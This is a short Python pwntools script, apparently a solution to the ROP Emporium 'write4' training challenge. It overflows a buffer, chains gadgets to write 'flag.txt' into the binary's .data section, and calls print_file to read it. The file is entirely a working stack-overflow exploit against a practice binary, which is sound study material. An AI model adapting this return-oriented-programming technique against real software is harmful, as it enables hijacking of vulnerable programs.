#!/usr/bin/python3
# coding: utf-8

from pwn import *
import sys
import binascii

"""
Cool gadgets :

    0x0400628: mov qword ptr [r14], r15; ret;
    0x0400690: pop r14; pop r15; ret;


On peut écrire sur les addresses suivantes :
    0x601000           0x602000 rw-p     1000 1000   /home/olivier/projets/rop_emporium/write4/write4/write4

    Adresse de la section .data
    0x601028


Passage de l'argument à print_file()

    0x400693: pop rdi; ret;
"""

"""
return a ropchain (bytesarray) that write the bytestring at
the given address.
Will be padded with '\x00' to reach a multiple of 8
"""
def write_mem(address, bytestring):
    
    
    # pad the bytestring to a multiple of 8
    if (len(bytestring) % 8 != 0):
        pad_length = len(bytestring) + (8 - len(bytestring) % 8) 

        bytestring = bytestring.ljust(pad_length, b'\x00')
        print (len(bytestring))

    ropchain = b''

    # write the bytestring in memory
    # 8 bytes at a time
    for i in range(0, int(len(bytestring) / 8)):
        ropchain += p64(0x0400690) # pop r14,15
        ropchain += p64(address + i * 8)
        ropchain += bytestring[i*8:(i+1)*8]

        ropchain += p64(0x0400628) # mov ptr[r14], r15

    return ropchain

buf  = b'A' * 40

buf += write_mem(0x601028, b'flag.txt')

# setup flag.txt at 0x601028
# we write "flag.txt" in $r15
# buf += p64(0x0400690) # pop r14,r15
# buf += p64(0x601028)
# buf += b'flag.txt'

# # write in .data section with mov gadget
# buf += p64(0x0400628) # mov ptr[r14], r15


# point $rdi to "flag.txt"
buf += p64(0x400693) # pop rdi
buf += p64(0x601028)

buf += p64(0x400516) # print_file@plt

sys.stdout.buffer.write(buf)